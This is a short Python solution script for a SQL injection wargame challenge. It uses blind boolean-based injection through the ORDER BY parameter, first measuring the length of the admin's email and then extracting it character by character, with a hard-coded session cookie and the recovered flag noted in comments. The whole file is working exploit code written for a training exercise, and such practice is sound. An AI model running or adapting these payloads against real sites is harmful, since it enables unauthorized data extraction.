from requests import Session, request

URL = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"
session = {"PHPSESSID": "c8o4nup8pn2fn76vsh9mlrmrni"}

EmailLength = 0
FLAG = ""


def lengthEmail():
    global EmailLength
    i = 0
    while True:
        i += 1
        payload = f"?order=if((id=%27admin%27%20and%20length(email)={i}),score,9999)%23"
        res = request(method='GET', url=URL + payload, cookies=session)
        print(f"[*] in progress {i}/{payload}")

        if "</td><td>50</td></tr><tr><td>rubiya</td>" in res.text:
            print("Find !! email length is ::", i)  # Find !! email length is :: 30
            EmailLength = i
            break


def getEmail():
    global EmailLength
    global FLAG

    for i in range(1, EmailLength + 1):
        for j in range(33, 127):

            payload = f"?order=if((id=%27admin%27 and ascii(substr(email,{i},1))={j}),score,9999)%23"
            res = request(method='GET', url=URL + payload, cookies=session)
            print(f"[*] in progress {(i, j)}/{payload}")

            if "</td><td>50</td></tr><tr><td>rubiya</td>" in res.text:
                FLAG = FLAG + chr(j)
                print(f"Find !! email[{str(i)}/{EmailLength}] is :: {chr(j)} ||| {FLAG}")
                break

        if FLAG == "":
            print("Not Correct payload...")
            break

    print(f"email :: {FLAG}")


if __name__ == '__main__':
    lengthEmail()
    getEmail()
    # email :: aasup3r_secure_email@emai1.com
    # ? 왜 이전 문제랑 구문이 같지
